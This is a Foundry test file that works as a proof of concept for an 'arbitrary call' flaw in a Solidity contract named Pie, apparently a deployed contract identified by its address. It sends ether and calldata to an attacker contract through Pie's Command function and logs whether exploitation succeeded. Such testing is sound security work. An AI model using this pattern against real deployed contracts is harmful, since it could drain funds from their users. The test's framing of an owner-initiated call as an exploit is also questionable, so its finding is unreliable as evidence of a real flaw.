// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xd2018bfaa266a9ec0a1a84b061640faa009def76.sol";

contract Attacker {
    bool public reentered;

    // Simulate malicious behavior
    function malicious() public payable {
        reentered = true;
    }
}

contract PieTest is Test {
    Pie public pie;
    Attacker public attacker;
    address private owner;
    uint256 private constant SEND_VALUE = 1 ether;

    function setUp() public {
        // Setup accounts and deploy contracts
        owner = makeAddr("owner");
        vm.prank(owner);
        pie = new Pie();
        attacker = new Attacker();
    }

    function testArbitraryCall() public {
        // Fund the owner who will initiate the vulnerable call
        deal(owner, SEND_VALUE);
        
        // Prepare call data to trigger malicious function
        bytes memory data = abi.encodeWithSignature("malicious()");
        
        console.log("--- BEFORE-Trigger State ---");
        uint256 attackerBalanceBefore = address(attacker).balance;
        bool reenteredBefore = attacker.reentered();
        console.log("Attacker balance before:", attackerBalanceBefore);
        console.log("Attacker reentered before:", reenteredBefore);

        console.log("--- Trigger: ArbitraryCall ---");
        vm.prank(owner);
        pie.Command{value: SEND_VALUE}(address(attacker), data);

        console.log("--- AFTER-Trigger State ---");
        uint256 attackerBalanceAfter = address(attacker).balance;
        bool reenteredAfter = attacker.reentered();
        console.log("Attacker balance after:", attackerBalanceAfter);
        console.log("Attacker reentered after:", reenteredAfter);

        // Check if both states changed as expected for exploitation
        bool balanceChanged = attackerBalanceAfter == attackerBalanceBefore + SEND_VALUE;
        bool stateChanged = !reenteredBefore && reenteredAfter;
        bool exploitSuccess = balanceChanged && stateChanged;

        if (exploitSuccess) {
            console.log("Vulnerability Exists: Arbitrary call executed successfully transferring %s wei and triggering state change", SEND_VALUE);
        } else {
            console.log("Vulnerability not Exist: Failed to meet exploitation conditions");
        }
    }
}